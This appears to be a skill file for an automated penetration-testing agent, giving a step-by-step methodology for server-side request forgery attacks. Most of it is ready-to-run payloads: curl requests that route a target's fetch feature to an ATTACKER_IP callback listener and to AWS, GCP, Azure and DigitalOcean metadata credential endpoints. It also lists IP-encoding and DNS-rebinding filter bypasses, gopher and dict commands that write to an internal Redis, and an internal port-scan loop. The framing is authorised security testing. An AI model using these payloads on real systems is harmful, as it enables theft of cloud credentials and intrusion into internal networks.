---
name: attack-ssrf
description: Apply when a parameter or feature causes the server to fetch a URL on the client's behalf (webhook, import, preview, PDF/image generation), to test whether that fetch can be redirected to internal services or cloud metadata.
metadata:
  acordia:
    family: web-attack
  cyberstrike:
    source: .cyberstrike/skill/attack-ssrf/SKILL.md
    commit: 359655518
---

# Server-Side Request Forgery (SSRF)

## Objective

Force the server to make requests to internal resources, cloud metadata endpoints, or attacker-controlled servers.

## Testing Methodology

### Phase 1: Identify URL Input Points

Look for parameters that accept URLs:
- Webhook URLs, callback URLs
- File import/export (URL-based)
- PDF/image generation from URL
- URL preview/unfurling
- Proxy/redirect endpoints

### Phase 2: Basic SSRF Payloads

```bash
# Start callback listener — logs every inbound request to ssrf_evidence.json
python3 - <<'PY' &
import http.server, json, datetime

LOG = "ssrf_evidence.json"

class Handler(http.server.BaseHTTPRequestHandler):
    def _log(self):
        entry = {
            "time": datetime.datetime.utcnow().isoformat(),
            "method": self.command,
            "path": self.path,
            "headers": dict(self.headers),
            "client": self.client_address[0],
        }
        with open(LOG, "a") as f:
            f.write(json.dumps(entry) + "\n")
        self.send_response(200)
        self.end_headers()

    do_GET = do_POST = _log

http.server.HTTPServer(("0.0.0.0", 8888), Handler).serve_forever()
PY
# Substitute an out-of-band collaborator (e.g. interact.sh, Burp Collaborator)
# when the target network cannot reach your host directly.

# Test URL parameters
curl "https://TARGET/api/fetch?url=http://ATTACKER_IP:8888/ssrf-test"
curl "https://TARGET/api/preview?link=http://127.0.0.1:80"
```

### Phase 3: Cloud Metadata

```bash
# AWS IMDSv1
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "https://TARGET/fetch?url=http://169.254.169.254/latest/user-data/"

# GCP
curl "https://TARGET/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
# (requires header: Metadata-Flavor: Google)

# Azure
curl "https://TARGET/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# (requires header: Metadata: true)

# DigitalOcean
curl "https://TARGET/fetch?url=http://169.254.169.254/metadata/v1/"
```

### Phase 4: Filter Bypass

```bash
# Decimal IP (127.0.0.1 = 2130706433)
curl "https://TARGET/fetch?url=http://2130706433/"

# Hex IP
curl "https://TARGET/fetch?url=http://0x7f000001/"

# IPv6
curl "https://TARGET/fetch?url=http://[::1]/"

# Alternate loopback notations
curl "https://TARGET/fetch?url=http://0.0.0.0/"
curl "https://TARGET/fetch?url=http://localhost/"
curl "https://TARGET/fetch?url=http://127.1/"
curl "https://TARGET/fetch?url=http://017700000001/"   # octal

# URL encoding
curl "https://TARGET/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/"

# DNS rebinding (use your own DNS server)
curl "https://TARGET/fetch?url=http://rebind.127.0.0.1.nip.io/"

# Redirect bypass
curl "https://TARGET/fetch?url=http://ATTACKER/redirect?to=http://169.254.169.254/"

# Protocol smuggling
curl "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_INFO"
curl "https://TARGET/fetch?url=gopher://127.0.0.1:6379/_SET%20key%20value"
curl "https://TARGET/fetch?url=dict://127.0.0.1:6379/SET:key:value"
```

### Phase 5: Internal Port Scanning

```bash
# Scan common internal ports
for port in 80 443 8080 8443 3306 5432 6379 27017 9200 11211; do
  curl -s -o /dev/null -w "%{http_code}" "https://TARGET/fetch?url=http://127.0.0.1:$port/" &
done
wait
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Cloud metadata access (credentials) | Critical (P1) |
| Internal network access | High (P2) |
| Out-of-band HTTP callback | Medium (P3) |
| Blind SSRF (timing-based) | Medium (P3) |
| File read via file:// protocol | Critical (P1) |
| gopher:// protocol access | High (P2) |

## Evidence Requirements

- URL parameter with SSRF payload
- Response containing internal data or metadata
- For blind SSRF: OOB callback evidence (Phase 2 listener)
- Network topology information gathered

## Tools

- `python3 -m http.server`-style listener (Phase 2) — OOB callback listener; substitute an external collaborator when the target cannot reach your host directly
- `curl` — manual SSRF testing

## References

- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)
- [OWASP: SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
